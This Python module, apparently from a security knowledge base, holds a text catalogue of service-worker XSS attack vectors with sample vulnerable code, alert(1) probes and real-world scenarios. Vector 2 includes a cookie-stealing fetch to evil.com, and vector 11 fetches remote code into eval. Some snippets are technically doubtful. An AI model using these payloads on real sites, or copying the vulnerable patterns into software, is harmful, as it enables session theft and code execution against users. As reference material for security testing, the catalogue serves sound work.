#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

Service Worker XSS Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
SERVICE WORKER XSS ATTACK VECTORS:

1. DYNAMIC REGISTRATION INJECTION:
   Server-side registration:
   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT);

   Attack payload:
   <script>alert(1)</script>

   Result: Service Worker URL becomes /sw.js?user=<script>alert(1)</script>

2. SERVICE WORKER SCRIPT INJECTION:
   Server generates Service Worker:
   self.addEventListener('install', function(event) {
     event.waitUntil(
       caches.open('USER_CACHE').then(function(cache) {
         return cache.addAll([
           '/index.html',
           '/manifest.json',
           USER_INPUT  // Injected URL
         ]);
       })
     );
   });

   Attack payload:
   data:text/javascript,fetch('http://evil.com/steal?c='+document.cookie)

3. CACHE MANIPULATION:
   Service Worker caches malicious content:
   caches.open('v1').then(function(cache) {
     cache.put('/api/user', new Response('<script>alert(1)</script>', {
       headers: {'Content-Type': 'application/json'}
     }));
   });

4. PUSH NOTIFICATION INJECTION:
   self.addEventListener('push', function(event) {
     const options = {
       body: USER_INPUT,  // Notification body
       icon: '/icon.png',
       badge: '/badge.png'
     };
     event.waitUntil(
       self.registration.showNotification('New Message', options)
     );
   });

   Attack payload:
   <script>alert(1)</script>

5. BACKGROUND SYNC INJECTION:
   self.addEventListener('sync', function(event) {
     if (event.tag == 'background-sync') {
       event.waitUntil(
         fetch('/api/sync', {
           method: 'POST',
           body: JSON.stringify({data: USER_INPUT})  // Injected data
         })
       );
     }
   });

6. FETCH EVENT INTERCEPTION:
   self.addEventListener('fetch', function(event) {
     if (event.request.url.includes('/api/user')) {
       event.respondWith(
         fetch(event.request).then(function(response) {
           return response.text().then(function(text) {
             return new Response(text + USER_INPUT, response);  // Injection
           });
         })
       );
     }
   });

ADVANCED SERVICE WORKER ATTACKS:

7. PERSISTENT CODE EXECUTION:
   Service Worker installs malicious cache:
   self.addEventListener('install', function(event) {
     event.waitUntil(
       caches.open('malicious-cache').then(function(cache) {
         return cache.addAll([
           'data:text/html,<script>alert(1)</script>'
         ]);
       })
     );
   });

8. OFFLINE PAGE INJECTION:
   self.addEventListener('fetch', function(event) {
     event.respondWith(
       caches.match('/offline.html').then(function(response) {
         return response || new Response(USER_INPUT);  // Offline XSS
       })
     );
   });

9. MANIFEST INJECTION:
   Service Worker updates manifest:
   caches.open('manifest').then(function(cache) {
     cache.put('/manifest.json', new Response(JSON.stringify({
       name: 'App',
       start_url: USER_INPUT  // Injected start URL
     })));
   });

10. MESSAGE PASSAGE ATTACK:
    Communication between page and Service Worker:
    navigator.serviceWorker.controller.postMessage(USER_INPUT);

    Service Worker receives:
    self.addEventListener('message', function(event) {
      // event.data contains XSS payload
    });

11. INSTALLATION EVENT ABUSE:
    self.addEventListener('install', function(event) {
      event.waitUntil(
        fetch(USER_INPUT).then(function(response) {  // Remote code execution
          return response.text();
        }).then(function(script) {
          eval(script);  // Code execution
        })
      );
    });

12. ACTIVATION PERSISTENCE:
    Service Worker activates and persists:
    self.addEventListener('activate', function(event) {
      event.waitUntil(
        clients.claim().then(function() {
          // Inject script into all open pages
          return clients.matchAll().then(function(clients) {
            clients.forEach(function(client) {
              client.postMessage('<script>alert(1)</script>');
            });
          });
        })
      );
    });

SERVICE WORKER SPECIFIC BYPASSES:

13. SCOPE MANIPULATION:
    Service Worker registration with broad scope:
    navigator.serviceWorker.register('/sw.js', {scope: '/'});

    Then inject into any page on domain

14. UPDATE MECHANISM ABUSE:
    Force Service Worker update with malicious version:
    navigator.serviceWorker.register('/sw-v2.js?xss=<script>alert(1)</script>');

15. UNINSTALLATION PREVENTION:
    Service Worker prevents uninstallation:
    self.addEventListener('beforeunload', function(event) {
      event.preventDefault();
      // Malicious code persists
    });

16. CLIENT CLAIM ATTACK:
    Service Worker claims all clients immediately:
    self.addEventListener('activate', function(event) {
      event.waitUntil(clients.claim());
    });

    Then sends malicious messages to all pages

17. CACHE POISONING:
    Service Worker poisons cache with malicious responses:
    caches.open('v1').then(function(cache) {
      return cache.put('/api/data', new Response('<script>alert(1)</script>'));
    });

18. OFFLINE FALLBACK INJECTION:
    self.addEventListener('fetch', function(event) {
      event.respondWith(
        fetch(event.request).catch(function() {
          return caches.match('/offline.html').then(function(response) {
            return new Response(response.text() + USER_INPUT);  // Offline XSS
          });
        })
      );
    });

REAL-WORLD ATTACK SCENARIOS:

19. PWA CHAT APPLICATION:
    - Service Worker handles offline messages
    - User message: <script>alert(1)</script>
    - Cached for offline use
    - Executes when user goes offline

20. E-COMMERCE PWA:
    - Service Worker caches product pages
    - Product name: <script>alert(1)</script>
    - Cached malicious content
    - Affects all users offline

21. BANKING APPLICATION:
    - Service Worker handles transactions offline
    - Transaction memo: <script>stealCredentials()</script>
    - Persistent credential theft

22. SOCIAL MEDIA PWA:
    - Service Worker manages notifications
    - Notification content: <script>alert(1)</script>
    - Real-time XSS via push notifications

23. COLLABORATIVE PLATFORM:
    - Service Worker syncs documents
    - Document content: <script>alert(1)</script>
    - Affects all collaborators

24. IOT CONTROL PANEL:
    - Service Worker caches device states
    - Device name: <script>alert(1)</script>
    - Device hijacking via cache

SERVICE WORKER DETECTION:

25. MANUAL TESTING:
    - Check Application tab in DevTools
    - Monitor Service Worker registration
    - Test offline functionality
    - Check cached content

26. AUTOMATED SCANNING:
    - Register test Service Workers
    - Send malicious payloads
    - Monitor for script execution
    - Test cache manipulation

27. BROWSER EXTENSIONS:
    - Service Worker interception
    - Payload injection testing
    - Offline behavior analysis
"""
